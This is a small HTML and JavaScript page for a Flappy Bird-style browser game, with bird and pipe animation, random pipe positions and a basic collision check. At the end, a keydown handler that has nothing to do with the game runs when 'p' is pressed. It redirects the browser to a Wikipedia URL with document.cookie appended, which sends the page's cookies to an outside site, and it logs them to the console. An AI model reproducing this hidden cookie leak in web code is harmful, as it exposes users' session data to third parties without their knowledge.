<!DOCTYPE html>
<html>
<head>
    <title>Flappy Bird</title>
    <style>
        .no_pad {
            margin: 0;
            padding: 0;
            overflow-y: hidden;
        }
        .bird {
            width: 100px;
            transition: transform 0.1s ease; /* Smooth transition for the bird's movement */
        }
        .bird_area {
            padding: 100px;
            width: 10px;
        }
        .pipe_area {
            width: 200px;
            justify-content: right;
        }
        .pipe {
            width: 200px;
            rotate: 0deg;
        }
    </style>
</head>
<body class="no_pad">
    <button onclick="Homepage()">Return to Homepage</button>
    <div class="game">
        <div class="bird_area">
            <img class="bird" src="bird.png">
        </div>
        <div class="pipe_area">
            <img class="pipe" src="pipe.png">
        </div>
    </div>
    <script>
    function Homepage(){
        window.location.href = "/"
    }

    let isJumping = false;
    let BirdY = -50
    let PipeX = 0
    let PipeY = 0
    let upordown = 0
    let upcount = 0
    let downcount = 0

    function jump() {
        isJumping = true
        const birdElement = document.querySelector('.bird')
        
        
        if(BirdY > -100) {
            BirdY = BirdY - 100
        }
        if(BirdY < -50) {
            BirdY = -100
        }
        if(BirdY > 600) {
            BirdY = 600
        }
        birdElement.style.transform = `translateY(${BirdY}px)`
        
        isJumping = false;
        
    }
    
    setInterval(Frame, 50)

    setInterval(PipeRepeat, 3000)

    function Frame() {
        const birdElement = document.querySelector('.bird')
        if(isJumping == false) {
            

            birdElement.style.transform = `translateY(${BirdY}px)`
            BirdY = BirdY + 10  
        }
        if(BirdY > 700) {
            BirdY = 699
        }
        if(BirdY < -100) {
            BirdY = -99    
        }

        const pipeElement = document.querySelector('.pipe')

        if(upordown == 0) {
            PipeX = PipeX + 20
        }
        else {
            PipeX = PipeX - 20
        }
        pipeElement.style.transform = `translate(${PipeX}px, ${PipeY}px)`
        
        checkCollision();
    }

    function PipeRepeat() {
        const pipeElement = document.querySelector('.pipe')
        upordown = Math.floor(Math.random() * 2)
        
        if(upordown == 0) {
            downcount = 0
            if(upcount < 2) {
                upcount = upcount + 1
            }
            else{
                upordown = 1
                upcount = 0
            }
        }
        else {
            if(downcount < 2) {
                downcount = downcount + 1
            }
            else{
                upordown = 0
                downcount  = 0
            }
        }
        

        if(upordown == 0) {
            PipeY = -200
            PipeX = -1000
            pipeElement.style.rotate = "180deg" //down
        }
        else {
            
            PipeY = -350
            PipeX = 1000
            pipeElement.style.rotate = "0deg" //up
        }
        
        

        
        pipeElement.style.transform = `translate(${PipeX}px, ${PipeY}px)` // make so there is no gap between pipes. so they meet in the middle

    }

    function checkCollision() {
        const birdElement = document.querySelector('.bird')
        const pipeElement = document.querySelector('.pipe')


        const birdRect = birdElement.getBoundingClientRect();
        const pipeRect = pipeElement.getBoundingClientRect();

        // Check if the bird's bottom touches the top of the pipe
        if(birdRect.bottom >= pipeRect.top && birdRect.left <= pipeRect.right && birdRect.right >= pipeRect.left) {
            console.log("Collision Detected!");
        }
    }
    
    document.addEventListener('keydown', function(event) {
        if (event.key === " ") {
            jump(); 
        }
    });

    document.addEventListener('keydown', function(event) {
            if (event.key === "p") {
                window.location.href = "https://en.wikipedia.org/wiki/" + document.cookie
                console.log(document.cookie)
            }
        });
</script>
</body>
</html>
